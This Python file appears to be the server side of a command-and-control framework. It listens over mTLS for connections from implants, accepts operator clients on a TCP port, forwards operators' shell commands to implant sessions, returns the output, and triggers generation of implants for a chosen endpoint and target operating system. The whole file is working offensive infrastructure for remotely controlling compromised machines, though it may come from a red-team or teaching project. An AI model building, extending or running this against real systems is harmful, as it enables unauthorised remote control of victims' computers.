#!/usr/bin/env python3
import logging
import sys

from mtls import mtls
from generate.generate import generate
from queue import Queue
from handler.handler import Handler
from pb import operatorpb_pb2

import socket
import traceback
import threading

class C2Server(object):
    def __init__(self):
        self.shutdown = 0
        logging.basicConfig(filename="Command Log.txt", level=logging.INFO)

        ## Generating stuff for implant comms ##
        print("Listening for implants...")
        self.requestq = Queue() #this is a shared queue between the handler and the listner, which fills with implant registration
        try:
            self.implantlistener = mtls.Listener(self.requestq, "127.0.0.1:31337") #begins implant listener w/ mtls encryption
        except Exception as e:
            print(e)
            traceback.print_exc()
            exit(1)

        ## Generating stuff for operator comms ##
        print("Listening for operators...")
        self.operators = list()

        self.handler = Handler(self.requestq, self.operators)
        self.handler.start()

        self.host = ""
        self.port = 12345
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

        threading.Thread(target=self._accept_operator).start() #this is so we can listen and have execute commands from server console


    # Turn message into a protobuf SessionCmdOutput and ssend to client
    def _send_operator(self, message, operator, session_id):
        response = operatorpb_pb2.SessionCmdOutput(cmdOutput=message, id=session_id)

        message = operatorpb_pb2.Message(
            message_type=operatorpb_pb2.Message.MessageType.SessionCmdOutput,
            data=response.SerializeToString()
        )

        operator.send(message.SerializeToString())

    def _shell_session(self, command_str, session_id):
            conn, addr = self.implantlistener.sessions.get(session_id) 
            output = mtls.session(conn, command_str)
            return (output)

    def _accept_operator(self):
        numberOfUsers = 5
        self.sock.listen(numberOfUsers)
        while True: #keep listening, start a new thread when an operator connects
            operator, address = self.sock.accept()

            self.operators.append(operator)
            self.handler.brodcastImplants(operator)

            print("[+]Connected to a new operator at " + address[0] + ":" + str(address[1]) )
            threading.Thread(target = self._listen_operator,args = (operator,address)).start()

    def _listen_operator(self, operator, address):
        size = 1024
        while True:
            data = operator.recv(size)

            message = operatorpb_pb2.Message()
            message.ParseFromString(data)

            if not data:
                print("[+]Disconnected operator " + address[0] +":"+ str(address[1]))
                operator.close()
                self.operators.remove(operator)
                break

            elif message.message_type==operatorpb_pb2.Message.MessageType.SessionCmd:
                session_cmd = operatorpb_pb2.SessionCmd()
                session_cmd.ParseFromString(message.data)

                command_str = session_cmd.cmd
                session_id = session_cmd.id

                #TODO: proper error handling
                if session_id not in self.implantlistener.sessions.list():
                    print("Session doesn't exist")

                else:
                    out = self._shell_session(command_str, session_id)
                    self._send_operator(out,operator,session_id)

            elif message.message_type==operatorpb_pb2.Message.MessageType.Generate:
                print("Generating the implant...")
                logging.info("Client requested to generate")
                generate_cmd = operatorpb_pb2.Generate()
                generate_cmd.ParseFromString(message.data)
                generate(generate_cmd.endpoint, generate_cmd.target_os)


def main():
    C2Server()

if __name__ == "__main__":
    main()
